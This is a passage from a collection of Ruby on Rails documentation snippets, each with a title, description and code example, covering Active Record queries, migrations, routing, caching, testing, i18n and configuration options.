DESCRIPTION: Sets a custom delimiter for joining the queue name prefix and the actual queue name. This example uses a period instead of the default underscore.

LANGUAGE: ruby
CODE:
# prefix must be set for delimiter to be used
config.active_job.queue_name_prefix = "video_server"
config.active_job.queue_name_delimiter = "."

----------------------------------------

TITLE: Creating Individual Test Databases for Active Record
DESCRIPTION: Commands to create test databases for MySQL and PostgreSQL separately, which is useful if you want to set up only specific database engines.

LANGUAGE: bash
CODE:
$ cd activerecord
$ bundle exec rake db:mysql:build
$ bundle exec rake db:postgresql:build

----------------------------------------

TITLE: Explicitly Requiring and Including Test Helpers
DESCRIPTION: Example of how to require and include a test helper module explicitly in a test file. This approach gives more control over which helpers are available in each test.

LANGUAGE: ruby
CODE:
require "test_helper"
require "test_helpers/multiple_assertions"

class NumberTest < ActiveSupport::TestCase
  include MultipleAssertions

  test "420 is a multiple of 42" do
    assert_multiple_of_forty_two 420
  end
end

----------------------------------------

TITLE: Using xmlschema Method with Fractional Seconds
DESCRIPTION: This Ruby code demonstrates how to use the xmlschema method with TimeWithZone objects to specify the precision of fractional seconds in the XML-formatted time string.

LANGUAGE: ruby
CODE:
Time.zone.now.xmlschema(6) # => "2009-01-16T13:00:06.13653Z"

----------------------------------------

TITLE: Using Prompts with Date Select Helpers in Rails
DESCRIPTION: This Ruby code demonstrates how to use custom prompts with date_select helpers in Rails 2.3. You can provide a boolean value, a string prompt, or a hash of individual prompts for different date/time components.

LANGUAGE: ruby
CODE:
select_datetime(DateTime.now, :prompt => true)

select_datetime(DateTime.now, :prompt => "Choose date and time")

select_datetime(DateTime.now, :prompt =>
  {:day => 'Choose day', :month => 'Choose month',
   :year => 'Choose year', :hour => 'Choose hour',
   :minute => 'Choose minute'})

----------------------------------------

TITLE: Querying the schema_migrations Table
DESCRIPTION: This SQL query retrieves all migration version numbers that have been applied to the database from the schema_migrations table.

LANGUAGE: sql
CODE:
SELECT * FROM schema_migrations;

----------------------------------------

TITLE: Setting Domain for Rails Session Cookies
DESCRIPTION: Demonstrates configuring the domain for session cookies, which determines which domains the cookie is available for. This is useful for sharing sessions across subdomains.

LANGUAGE: ruby
CODE:
Rails.application.config.session_store :cookie_store, key: "_your_app_session", domain: ".example.com"

----------------------------------------

TITLE: Using Path Helper in ERB Template
DESCRIPTION: Demonstrates how to use the user_path helper method in an ERB template to generate a link to a user record.

LANGUAGE: erb
CODE:
<%= link_to 'User Record', user_path(@user) %>

----------------------------------------

TITLE: Using Time Ranges with all_day and all_week
DESCRIPTION: Example of using the new time range methods all_day and all_week to simplify creating date ranges for queries.

LANGUAGE: ruby
CODE:
Event.where(:created_at => Time.now.all_week)
Event.where(:created_at => Time.now.all_day)

----------------------------------------

TITLE: Demonstrating Relation Creation Behavior Change in Rails 6.1
DESCRIPTION: Shows a code sample highlighting how relation.create no longer leaks scope to class-level querying methods in initialization blocks and callbacks.

LANGUAGE: ruby
CODE:
User.where(name: "John").create do |john|
  User.find_by(name: "David") # => nil
end

LANGUAGE: ruby
CODE:
User.where(name: "John").create do |john|
  User.find_by(name: "David") # => #<User name: "David", ...>
end

----------------------------------------

TITLE: Using Beginless Ranges for Greater Than Conditions
DESCRIPTION: Shows how to use Ruby's beginless range syntax to create greater-than-or-equal-to conditions in database queries.

LANGUAGE: ruby
CODE:
Book.where(created_at: (Time.now.midnight - 1.day)..)

----------------------------------------

TITLE: Building and Running a Rails Application using Docker
DESCRIPTION: Commands to build a Docker image from a Rails application, create a volume for storage, and run the application in a container. This demonstrates the new Docker support included in Rails 7.1.

LANGUAGE: bash
CODE:
$ docker build -t app .
$ docker volume create app-storage
$ docker run --rm -it -v app-storage:/rails/storage -p 3000:3000 --env RAILS_MASTER_KEY=<your-config-master-key> app

----------------------------------------

TITLE: Using assert_generates for Testing Route Generation in Rails
DESCRIPTION: Tests that provided options can be used to generate the expected path, which is the inverse of assert_recognizes.

LANGUAGE: ruby
CODE:
assert_generates(expected_path, options, defaults = {}, extras = {}, message = nil)

----------------------------------------

TITLE: Using the Association Owner in Scopes in Rails
DESCRIPTION: Demonstrates passing the owner of the association as an argument to the scope block for dynamic scoping. This example scopes the account association based on the active status of the supplier.

LANGUAGE: ruby
CODE:
class Supplier < ApplicationRecord
  has_one :account, ->(supplier) { where active: supplier.active? }
end

----------------------------------------

TITLE: Using Custom Layout in Rails Render
DESCRIPTION: Example showing how to specify a custom layout when rendering a view. This overrides the default layout for the current action only.

LANGUAGE: ruby
CODE:
render layout: "special_layout"

----------------------------------------

TITLE: Example Rails Middleware Stack Output
DESCRIPTION: Shows the typical output of the middleware command for a freshly generated Rails application. This example displays the default middleware stack that Rails uses.

LANGUAGE: ruby
CODE:
use ActionDispatch::HostAuthorization
use Rack::Sendfile
use ActionDispatch::Static
use ActionDispatch::Executor
use ActionDispatch::ServerTiming
use ActiveSupport::Cache::Strategy::LocalCache::Middleware
use Rack::Runtime
use Rack::MethodOverride
use ActionDispatch::RequestId
use ActionDispatch::RemoteIp
use Sprockets::Rails::QuietAssets
use Rails::Rack::Logger
use ActionDispatch::ShowExceptions
use WebConsole::Middleware
use ActionDispatch::DebugExceptions
use ActionDispatch::ActionableExceptions
use ActionDispatch::Reloader
use ActionDispatch::Callbacks
use ActiveRecord::Migration::CheckPending
use ActionDispatch::Cookies
use ActionDispatch::Session::CookieStore
use ActionDispatch::Flash
use ActionDispatch::ContentSecurityPolicy::Middleware
use Rack::Head
use Rack::ConditionalGet
use Rack::ETag
use Rack::TempfileReaper
run MyApp::Application.routes

----------------------------------------

TITLE: Running the Full Rails Test Suite
DESCRIPTION: Commands to run all tests in the Rails codebase. This is comprehensive but time-consuming and not always necessary for every change.

LANGUAGE: bash
CODE:
$ cd rails
$ bundle exec rake test

----------------------------------------

TITLE: Debugging Objects in Rails Views with debug Helper
DESCRIPTION: The debug helper displays a YAML representation of an object wrapped in a pre tag. It provides a readable way to inspect complex data structures in views during development.

LANGUAGE: ruby
CODE:
my_hash = { "first" => 1, "second" => "two", "third" => [1, 2, 3] }
debug(my_hash)

LANGUAGE: html
CODE:
<pre class="debug_dump">---
first: 1
second: two
third:
- 1
- 2
- 3
</pre>

----------------------------------------

TITLE: Using raw Helper for Unescaped Output in ERB
DESCRIPTION: Demonstrates using the raw helper to insert content without escaping, useful for trusted HTML from content management systems.

LANGUAGE: erb
CODE:
<%= raw @cms.current_template %> <%# inserts @cms.current_template as is %>

----------------------------------------

TITLE: Pattern Matching with Nokogiri HTML in Rails Tests
DESCRIPTION: Example demonstrating how to combine Nokogiri's pattern matching support with Minitest's assert_pattern for making assertions about HTML structure and content in tests.

LANGUAGE: ruby
CODE:
get "/posts"

html = response.parsed_body # => <html>
                            #      <head></head>
                            #        <body>
                            #          <main><h1>Some main content</h1></main>
                            #        </body>
                            #     </html>

assert_pattern { html.at("main") => { content: "Some main content" } }
assert_pattern { html.at("main") => { content: /content/ } }
assert_pattern { html.at("main") => { children: [{ name: "h1", content: /content/ }] } }

----------------------------------------

TITLE: Setting custom response headers in Rails
DESCRIPTION: This snippet shows how to set custom response headers in a Rails controller. The headers attribute is a hash that maps header names to values, allowing you to add any custom headers needed for the response.

LANGUAGE: ruby
CODE:
response.headers["X-Custom-Header"] = "some value"

----------------------------------------

TITLE: Configuring File Watchers for Development
DESCRIPTION: Ruby configuration to use the evented file watcher in development, which can improve performance when working with many assets by reducing the overhead of checking for file updates.

LANGUAGE: ruby
CODE:
config.file_watcher = ActiveSupport::EventedFileUpdateChecker

----------------------------------------

TITLE: Incorrect Namespace Definition Using Struct.new in Ruby
DESCRIPTION: Another incorrect approach to defining namespaces that won't work with Rails autoloading. Child objects like Hotel::Pricing won't be found when using this pattern.

LANGUAGE: ruby
CODE:
Hotel = Struct.new

----------------------------------------

TITLE: Starting a Service with Homebrew on macOS
DESCRIPTION: Command to start a specific service (using MySQL as an example) with Homebrew on macOS. This is necessary to have required services running for Rails testing.

LANGUAGE: bash
CODE:
$ brew services start mysql

----------------------------------------

TITLE: Updating an Existing Rails Pull Request with Git
DESCRIPTION: This snippet shows how to update an existing pull request by amending a commit and force pushing to your branch. This is useful when responding to feedback on a pull request that requires changes to existing commits.

LANGUAGE: bash
CODE:
$ git commit --amend
$ git push fork my_new_branch --force-with-lease

----------------------------------------

TITLE: Enabling Verbose Query Logs in Rails Console
DESCRIPTION: Shows how to enable verbose query logs in the Rails console to identify the source of database queries, which helps in debugging N+1 query issues.

LANGUAGE: ruby
CODE:
ActiveRecord.verbose_query_logs = true

----------------------------------------

TITLE: Generated Model Using Database-Specific Abstract Class
DESCRIPTION: Example of a model that inherits from the database-specific abstract class, making it connected to the specified database.

LANGUAGE: ruby
CODE:
class Dog < AnimalsRecord
end

----------------------------------------

TITLE: Generating Rails Scaffold for Articles
DESCRIPTION: A bash command showing the scaffold generation for an article resource, which automatically creates controller and view files.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold article
      [...]
      invoke  scaffold_controller
      create    app/controllers/articles_controller.rb
      invoke    erb
      create      app/views/articles
      create      app/views/articles/index.html.erb
      create      app/views/articles/edit.html.erb
      create      app/views/articles/show.html.erb
      create      app/views/articles/new.html.erb
      create      app/views/articles/_form.html.erb
      [...]

----------------------------------------

TITLE: Configuring Unauthenticated Access in Rails Controller
DESCRIPTION: Ruby code to allow unauthenticated access to specific controller actions. This permits guest users to view product index and show pages without requiring authentication.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  allow_unauthenticated_access only: %i[ index show ]
  # ...
end

----------------------------------------

TITLE: Creating an Object in Controller Action
DESCRIPTION: This snippet shows how to create a new model instance in a controller action and make it available to the view through an instance variable.

LANGUAGE: ruby
CODE:
def new
  @client = Client.new
end

----------------------------------------

TITLE: Configuring ActiveSupport::MessagePack as Message Serializer
DESCRIPTION: Example of configuring the new MessagePack serializer as the default message serializer for improved performance and reduced payload size compared to JSON and Marshal.

LANGUAGE: ruby
CODE:
config.active_support.message_serializer = :message_pack

# Or individually:
ActiveSupport::MessageEncryptor.new(secret, serializer: :message_pack)
ActiveSupport::MessageVerifier.new(secret, serializer: :message_pack)

----------------------------------------

TITLE: Verifying Rails Installation via CLI
DESCRIPTION: This command shows how to verify that Rails has been installed correctly by checking its version in the terminal.

LANGUAGE: bash
CODE:
$ rails --version
Rails 8.0.0

----------------------------------------

TITLE: Using Module#concerning for code organization in Rails 4.1
DESCRIPTION: Example of using the new Module#concerning feature to separate responsibilities within a class. This provides a clean way to organize related methods and callbacks.

LANGUAGE: ruby
CODE:
class Todo < ActiveRecord::Base
  concerning :EventTracking do
    included do
      has_many :events
    end

    def latest_event
      # ...
    end

    private
      def some_internal_method
        # ...
      end
  end
end

----------------------------------------

TITLE: Generated SQL for Cross-Database has_many through Association with disable_joins
DESCRIPTION: Example of SQL queries generated when using disable_joins option with a has_many through association. Instead of attempting a join across databases, Rails performs two separate queries.

LANGUAGE: sql
CODE:
SELECT "humans"."id" FROM "humans" WHERE "humans"."dog_id" = ?  [["dog_id", 1]]
SELECT "treats".* FROM "treats" WHERE "treats"."human_id" IN (?, ?, ?)  [["human_id", 1], ["human_id", 2], ["human_id", 3]]

----------------------------------------

TITLE: Creating Database Tables for One-to-One Relationships
DESCRIPTION: Shows a migration for creating tables to support a one-to-one relationship between suppliers and accounts, with proper foreign key setup.

LANGUAGE: ruby
CODE:
class CreateSuppliers < ActiveRecord::Migration[8.1]
  def change
    create_table :suppliers do |t|
      t.string :name
      t.timestamps
    end

    create_table :accounts do |t|
      t.belongs_to :supplier_id
      t.string :account_number
      t.timestamps
    end

    add_index :accounts, :supplier_id
  end
end

----------------------------------------

TITLE: Implementing ActiveModel::Callbacks in Ruby
DESCRIPTION: This code shows how to implement lifecycle callbacks in a plain Ruby object using ActiveModel::Callbacks. It defines before, after, and around callbacks for an update method, demonstrating the proper setup and execution pattern for model callbacks.

LANGUAGE: ruby
CODE:
class Person
  extend ActiveModel::Callbacks

  define_model_callbacks :update

  before_update :reset_me
  after_update :finalize_me
  around_update :log_me

  # `define_model_callbacks` method containing `run_callbacks` which runs the callback(s) for the given event
  def update
    run_callbacks(:update) do
      puts "update method called"
    end
  end

  private
    # When update is called on an object, then this method is called by `before_update` callback
    def reset_me
      puts "reset_me method: called before the update method"
    end

    # When update is called on an object, then this method is called by `after_update` callback
    def finalize_me
      puts "finalize_me method: called after the update method"
    end

    # When update is called on an object, then this method is called by `around_update` callback
    def log_me
      puts "log_me method: called around the update method"
      yield
      puts "log_me method: block successfully called"
    end
end

----------------------------------------

TITLE: Using blocks with has_one associations in Active Record
DESCRIPTION: Demonstrates the new ability to set attributes to singular associations using blocks. The block gets called after the instance is initialized.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  has_one :account
end

user.build_account{ |a| a.credit_limit = 100.0 }

----------------------------------------

TITLE: Real-world Example of YAML Translations for Date Formats
DESCRIPTION: A practical example from Active Support's en.yml file showing date format translations. Demonstrates nested keys for organizing translations by context.

LANGUAGE: yaml
CODE:
en:
  date:
    formats:
      default: "%Y-%m-%d"
      short: "%b %d"
      long: "%B %d, %Y"

----------------------------------------

TITLE: Installing new database adapter dependencies with Bundler
DESCRIPTION: After changing the database system, you need to install the required gems with bundle install, which will download and set up the necessary dependencies.

LANGUAGE: bash
CODE:
$ bundle install
...

----------------------------------------

TITLE: Checking Value Presence in a Collection
DESCRIPTION: A utility method to check if an object is present in a given collection, useful for validating permitted values.

LANGUAGE: ruby
CODE:
Object#presence_in

----------------------------------------

TITLE: Using Custom Lock Types with Raw SQL in Rails
DESCRIPTION: Shows how to use custom SQL lock expressions by passing raw SQL to the lock method. This example uses MySQL's 'LOCK IN SHARE MODE' which allows other transactions to read but not update the locked record while incrementing the views count.

LANGUAGE: ruby
CODE:
Book.transaction do
  book = Book.lock("LOCK IN SHARE MODE").find(1)
  book.increment!(:views)
end

----------------------------------------

TITLE: Registering Custom Response Parser for RSS in View Tests
DESCRIPTION: Example showing how to register a custom parser for RSS content in view tests. This allows testing RSS output with assertions on the parsed RSS structure.

LANGUAGE: ruby
CODE:
register_parser :rss, -> rendered { RSS::Parser.parse(rendered) }

test "renders RSS" do
  article = Article.create!(title: "Hello, world")

  render formats: :rss, partial: article, locals: { article: article }

  assert_equal "Hello, world", rendered_rss.items.last.title
end

----------------------------------------

TITLE: Updating Main Plugin Module with Core Extension Requirement
DESCRIPTION: Modified main plugin file that requires the core extension file. This shows how to structure the plugin's main file to load all necessary components.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle.rb

require "yaffle/version"
require "yaffle/railtie"
require "yaffle/core_ext"

module Yaffle
  # Your code goes here...
end

----------------------------------------

TITLE: Replacing Where Conditions with rewhere in ActiveRecord
DESCRIPTION: Demonstrates how to use the 'rewhere' method to replace an existing where condition instead of combining it with AND, which can prevent contradictory conditions.

LANGUAGE: ruby
CODE:
Book.where(out_of_print: true).rewhere(out_of_print: false)

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE out_of_print = 0

LANGUAGE: ruby
CODE:
Book.where(out_of_print: true).where(out_of_print: false)

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE out_of_print = 1 AND out_of_print = 0

----------------------------------------

TITLE: Precompiling Assets with Dummy Secret Key
DESCRIPTION: Command to precompile assets using a temporary secret key base, useful for CI/CD pipelines where production secrets may not be available during the build process.

LANGUAGE: bash
CODE:
$ RAILS_ENV=production SECRET_KEY_BASE_DUMMY=1 rails assets:precompile

----------------------------------------

TITLE: Configuring SSL Options for HSTS with Subdomains
DESCRIPTION: Rails 5 allows configuring HTTP Strict Transport Security (HSTS) with subdomain support through this SSL option setting for enhanced security.

LANGUAGE: ruby
CODE:
config.ssl_options = { hsts: { subdomains: true } }

----------------------------------------

TITLE: Using Dirty API Methods in ActiveModel
DESCRIPTION: New API methods added to ActiveModel::Dirty for controlling changes state throughout the object lifecycle.

LANGUAGE: ruby
CODE:
reset_changes and changes_applied

----------------------------------------

TITLE: Configuring Locale-Scoped Routes in Rails
DESCRIPTION: Route configuration to include locale in the URL path, organizing resources under language-specific paths like /en/books or /nl/books.

LANGUAGE: ruby
CODE:
# config/routes.rb
scope "/:locale" do
  resources :books
end

----------------------------------------

TITLE: Backtrace Display After Catch Breakpoint Triggers
DESCRIPTION: Displays the stack trace after a catch breakpoint for ActiveRecord::RecordInvalid has been triggered. It shows the top 10 stack frames to help identify where the validation error originated.

LANGUAGE: ruby
CODE:
Stop by #0  BP - Catch  "ActiveRecord::RecordInvalid"

(rdbg:catch) bt 10
=>#0    ActiveRecord::Validations#raise_validation_error at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:80
  #1    ActiveRecord::Validations#save!(options={}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:53
  #2    block in save! at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/transactions.rb:302

----------------------------------------

TITLE: Adding Custom Middleware to Rails Application
DESCRIPTION: Shows how to add custom middleware to the Rails middleware stack. This method puts the middleware at the end of the stack.

LANGUAGE: ruby
CODE:
config.middleware.use Magical::Unicorns

----------------------------------------

TITLE: Configuring Error Reporting for ActionMailer Jobs
DESCRIPTION: Example of how to handle errors specifically for ActionMailer's MailDeliveryJob. This ensures that mail delivery errors are also captured and reported to your error tracking service.

LANGUAGE: ruby
CODE:
class ApplicationMailer < ActionMailer::Base
  ActionMailer::MailDeliveryJob.rescue_from(Exception) do |exception|
    Rails.error.report(exception)
    raise exception
  end
end

----------------------------------------

TITLE: Indenting String Content in Ruby
DESCRIPTION: Shows using the indent method to add consistent indentation to each line of a string.

LANGUAGE: ruby
CODE:
<<EOS.indent(2)
def some_method
  some_code
end
EOS
# =>
  def some_method
    some_code
  end

----------------------------------------

TITLE: Overriding Resource Route Names in Rails
DESCRIPTION: Overrides the default resource routing helper names by placing a custom named route before the resource definition. This allows for more intuitive route helpers.

LANGUAGE: ruby
CODE:
get ":username", to: "users#show", as: :user
resources :users

----------------------------------------

TITLE: Generated Abstract Database Record Class
DESCRIPTION: Example of an automatically generated abstract class for a specific database that handles connection management. This class is created when using database-specific generators.

LANGUAGE: ruby
CODE:
class AnimalsRecord < ApplicationRecord
  self.abstract_class = true

  connects_to database: { writing: :animals }
end

----------------------------------------

TITLE: Removing Nil Values from Hashes in Rails
DESCRIPTION: Methods for removing key-value pairs with nil values from hashes.

LANGUAGE: ruby
CODE:
Hash#compact

LANGUAGE: ruby
CODE:
Hash#compact!

----------------------------------------

TITLE: Configuring Default MemCacheStore in Rails
DESCRIPTION: Sets up a Memcached-based cache store with default settings. It will use the MEMCACHE_SERVERS environment variable if set, or fall back to localhost on the default port.

LANGUAGE: ruby
CODE:
config.cache_store = :mem_cache_store # Will fallback to $MEMCACHE_SERVERS, then 127.0.0.1:11211

----------------------------------------

TITLE: Generating Scaffold for Sharded Database
DESCRIPTION: Creating a scaffold that will be placed in the shared migrations directory specified for sharded databases.

LANGUAGE: bash
CODE:
$ bin/rails g scaffold Dog name:string --database primary_shard_one

----------------------------------------

TITLE: Implementing halted_callback_hook with Two Arguments in Ruby on Rails
DESCRIPTION: Example of the breaking change in ActiveSupport::Callbacks#halted_callback_hook which now receives a second argument (callback_name). Classes overriding this method need to accept two arguments.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  before_save { throw(:abort) }
  before_create { throw(:abort) }

  def halted_callback_hook(filter, callback_name) # => This method now accepts 2 arguments instead of 1
    Rails.logger.info("Book couldn't be #{callback_name}d")
  end
end

----------------------------------------

TITLE: Using Distinct in ActiveRecord Queries
DESCRIPTION: Demonstrates how to use the 'distinct' method to retrieve unique values from a specified column, eliminating duplicate results.

LANGUAGE: ruby
CODE:
Customer.select(:last_name).distinct

LANGUAGE: sql
CODE:
SELECT DISTINCT last_name FROM customers

LANGUAGE: ruby
CODE:
# Returns unique last_names
query = Customer.select(:last_name).distinct

# Returns all last_names, even if there are duplicates
query.distinct(false)

----------------------------------------

TITLE: Accessing Fixture Objects in Rails Tests
DESCRIPTION: Demonstrates how to access fixture objects in test cases. Shows retrieving specific fixtures by name, accessing their properties, and calling methods on the fixture objects.

LANGUAGE: ruby
CODE:
# this will return the User object for the fixture named david
users(:david)

# this will return the property for david called id
users(:david).id

# methods available to the User object can also be accessed
david = users(:david)
david.call(david.partner)

----------------------------------------

TITLE: Testing RDoc Output from Command Line
DESCRIPTION: Shows how to quickly test RDoc markup rendering from the command line using the rdoc --pipe command.

LANGUAGE: bash
CODE:
$ echo "+:to_param+" | rdoc --pipe
# => <p><code>:to_param</code></p>

----------------------------------------

TITLE: Custom Time Format for Pirate Locale in YAML
DESCRIPTION: YAML configuration for a custom 'pirate' locale defining a humorous time format for the :short format option.

LANGUAGE: yaml
CODE:
# config/locales/pirate.yml
pirate:
  time:
    formats:
      short: "arrrround %H'ish"

----------------------------------------

TITLE: Edge Cases with prev_quarter and next_quarter in Ruby
DESCRIPTION: Examples showing how prev_quarter and next_quarter handle edge cases with month-end dates and leap years.

LANGUAGE: ruby
CODE:
Time.local(2000, 7, 31).prev_quarter  # => 2000-04-30 00:00:00 +0300
Time.local(2000, 5, 31).prev_quarter  # => 2000-02-29 00:00:00 +0200
Time.local(2000, 10, 31).prev_quarter # => 2000-07-31 00:00:00 +0300
Time.local(2000, 11, 31).next_quarter # => 2001-03-01 00:00:00 +0200

----------------------------------------

TITLE: Cache Prune Event Structure in Active Support
DESCRIPTION: Shows the structure of the payload for the cache_prune.active_support event, which is emitted only when using MemoryStore. Includes the store class name, target size, and original size.

LANGUAGE: ruby
CODE:
{
  store: "ActiveSupport::Cache::MemoryStore",
  key: 5000,
  from: 9001
}

----------------------------------------

TITLE: Updating Routes to Use PATCH in Rails 4
DESCRIPTION: Example of updating a custom route to use PATCH instead of PUT in Rails 4. This is recommended when the action is not part of a public API.

LANGUAGE: ruby
CODE:
resources :users do
  patch :update_name, on: :member
end

----------------------------------------

TITLE: Generating an Empty Migration with Rails Command
DESCRIPTION: This bash command generates an empty migration file for adding a part number to products. The generated file includes a timestamp and follows Rails naming conventions.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddPartNumberToProducts

----------------------------------------

TITLE: Executing Raw SQL in Rails Migrations
DESCRIPTION: Demonstrates using the execute method to run raw SQL commands within migrations. This example updates product prices in the up method and provides a rollback strategy in the down method.

LANGUAGE: ruby
CODE:
class UpdateProductPrices < ActiveRecord::Migration[8.1]
  def up
    execute "UPDATE products SET price = 'free'"
  end

  def down
    execute "UPDATE products SET price = 'original_price' WHERE price = 'free';"
  end
end

----------------------------------------

TITLE: Overriding Route Helpers with :as Option in Ruby on Rails
DESCRIPTION: Demonstrates how to override default naming for route helpers using the :as option with resources. This allows you to customize the generated helper method names while maintaining the standard RESTful routing structure.

LANGUAGE: ruby
CODE:
resources :photos, as: "images"

----------------------------------------

TITLE: Rails Autoloading Controller Example
DESCRIPTION: Shows how Rails automatically loads dependencies without requiring explicit require statements, demonstrating a controller that references ApplicationController and Post models.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

----------------------------------------

TITLE: Demonstrating Action Mailer Deferred Execution in Rails 4.2
DESCRIPTION: Code example showing the new behavior of Action Mailer in Rails 4.2, where mailer method execution is deferred until deliver_now or deliver_later is called, in contrast to previous versions where methods executed immediately.

LANGUAGE: ruby
CODE:
class Notifier < ActionMailer::Base
  def notify(user)
    puts "Called"
    mail(to: user.email)
  end
end

----------------------------------------

TITLE: Disabling YJIT in Rails Configuration
DESCRIPTION: Example of how to disable the YJIT Ruby JIT compiler which is enabled by default in Rails 7.2 when running on Ruby 3.3+. YJIT can provide 15-25% latency improvements for Rails applications.

LANGUAGE: ruby
CODE:
Rails.application.config.yjit = false

----------------------------------------

TITLE: Using NameError and LoadError Extensions for Helper Module Handling
DESCRIPTION: Shows how Rails uses the ActiveSupport extensions to NameError and LoadError for gracefully handling missing helper modules. The code attempts to load helper modules and uses the missing_name? and is_missing? methods to determine whether exceptions should be reraised.

LANGUAGE: ruby
CODE:
def default_helper_module!
  module_name = name.delete_suffix("Controller")
  module_path = module_name.underscore
  helper module_path
rescue LoadError => e
  raise e unless e.is_missing? "helpers/#{module_path}_helper"
rescue NameError => e
  raise e unless e.missing_name? "#{module_name}Helper"
end

----------------------------------------

TITLE: Disabling Automatic Filter Parameters for Encrypted Columns
DESCRIPTION: Disables the automatic addition of encrypted columns to Rails log filtering. By default, encrypted columns are filtered in Rails logs to prevent sensitive data exposure.

LANGUAGE: ruby
CODE:
config.active_record.encryption.add_to_filter_parameters = false

----------------------------------------

TITLE: Installing JavaScript Dependencies with Yarn
DESCRIPTION: Command to install JavaScript dependencies using Yarn. This is necessary for testing components that rely on JavaScript, such as Action Cable and Active Storage.

LANGUAGE: bash
CODE:
$ yarn install

----------------------------------------

TITLE: Reloading Console After Model Changes in Rails
DESCRIPTION: Demonstrates how to reload the Rails console after making changes to model code. This is necessary because the console doesn't automatically pick up code changes while it's running.

LANGUAGE: irb
CODE:
store(dev)> reload!
Reloading...

----------------------------------------

TITLE: Wrapping Application Code with Rails Executor
DESCRIPTION: Demonstrates how to wrap application code with the Rails Executor to ensure proper handling of autoloading, connection management, and caching. This is the recommended approach for libraries or components that invoke application code.

LANGUAGE: ruby
CODE:
Rails.application.executor.wrap do
  # call application code here
end

----------------------------------------

TITLE: Handling GET Request Example in Rails
DESCRIPTION: An example of a simple GET request to a user resource. This shows how the router matches the request URL to a specific path pattern.

LANGUAGE: plain
CODE:
GET /users/17

----------------------------------------

TITLE: Setting Job Priority in Ruby on Rails
DESCRIPTION: Demonstrates how to set the priority of a job using the queue_with_priority method, which determines the order in which jobs are processed.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  queue_with_priority 10
  # ...
end

----------------------------------------

TITLE: Default Model Test Stub in Rails
DESCRIPTION: Shows the default test file generated by Rails when creating a new model with the generator command. This provides the basic structure for model testing.

LANGUAGE: ruby
CODE:
require "test_helper"

class ArticleTest < ActiveSupport::TestCase
  # test "the truth" do
  #   assert true
  # end
end

----------------------------------------

TITLE: Disabling Connection Pooling for Cache Stores
DESCRIPTION: Configuration example showing how to disable connection pooling for mem_cache_store or redis_cache_store. By default these stores use connection pooling for threaded servers.

LANGUAGE: ruby
CODE:
config.cache_store = :mem_cache_store, "cache.example.com", { pool: false }

----------------------------------------

TITLE: Setting a Global Compression Algorithm for Encryption
DESCRIPTION: Configures a custom compression algorithm globally for all encrypted attributes. This overrides the default Zlib compressor for all encrypted attributes across the application.

LANGUAGE: ruby
CODE:
config.active_record.encryption.compressor = ZstdCompressor

----------------------------------------

TITLE: Using grouped_options_for_select Helper in Rails Views
DESCRIPTION: This Ruby code demonstrates the grouped_options_for_select helper method that creates option tags grouped with optgroup tags. It shows how to pass an array of arrays with grouping labels and option values.

LANGUAGE: ruby
CODE:
grouped_options_for_select([["Hats", ["Baseball Cap","Cowboy Hat"]]],
  "Cowboy Hat", "Choose a product...")

----------------------------------------

TITLE: Restricting Routes with :only Option in Rails
DESCRIPTION: Demonstrates how to limit which RESTful routes are created using the :only option. This creates only the specified routes instead of all seven default actions.

LANGUAGE: ruby
CODE:
resources :photos, only: [:index, :show]

----------------------------------------

TITLE: Using ActiveRecord Model to_param Method
DESCRIPTION: Rails 4.1 adds to_param to ActiveRecord::Base for creating convenient 'pretty' URLs derived from model attributes or methods.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.to_param

----------------------------------------

TITLE: Demonstrating String#deconstantize Method in Ruby on Rails
DESCRIPTION: Examples showing how deconstantize removes the rightmost segment from a qualified constant reference, leaving the container namespace.

LANGUAGE: ruby
CODE:
"Product".deconstantize                        # => ""
"Backoffice::UsersController".deconstantize    # => "Backoffice"
"Admin::Hotel::ReservationUtils".deconstantize # => "Admin::Hotel"

----------------------------------------

TITLE: Basic Rails Application with Locale Support
DESCRIPTION: A complete example showing routes, controller setup with locale switching, and a basic view in a Rails application with internationalization support.

LANGUAGE: ruby
CODE:
# config/routes.rb
Rails.application.routes.draw do
  root to: "home#index"
end

LANGUAGE: ruby
CODE:
# app/controllers/application_controller.rb
class ApplicationController < ActionController::Base
  around_action :switch_locale

  def switch_locale(&action)
    locale = params[:locale] || I18n.default_locale
    I18n.with_locale(locale, &action)
  end
end

LANGUAGE: ruby
CODE:
# app/controllers/home_controller.rb
class HomeController < ApplicationController
  def index
    flash[:notice] = "Hello Flash"
  end
end

LANGUAGE: html+erb
CODE:
<!-- app/views/home/index.html.erb -->
<h1>Hello World</h1>
<p><%= flash[:notice] %></p>

----------------------------------------

TITLE: Computing DateTime with Advance Method Order in Ruby
DESCRIPTION: This example demonstrates how the order of operations matters when using advance with DateTime. First computing date components and then time components yields different results than the reverse order.

LANGUAGE: ruby
CODE:
d = DateTime.new(2010, 2, 28, 23, 59, 59)
# => Sun, 28 Feb 2010 23:59:59 +0000
d.advance(months: 1, seconds: 1)
# => Mon, 29 Mar 2010 00:00:00 +0000

----------------------------------------

TITLE: SQL Statement Documentation Format in Ruby
DESCRIPTION: Demonstrates the proper format for documenting SQL statements generated by Rails methods, without using the arrow notation.

LANGUAGE: ruby
CODE:
#   User.where(name: 'Oscar').to_sql
#   # SELECT "users".* FROM "users"  WHERE "users"."name" = 'Oscar'

----------------------------------------

TITLE: Configuring Custom Acceptable Values for Acceptance Validation
DESCRIPTION: Example showing how to specify custom values that will be considered acceptable for acceptance validation using the accept option.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :terms_of_service, acceptance: { accept: "yes" }
  validates :eula, acceptance: { accept: ["TRUE", "accepted"] }
end

----------------------------------------

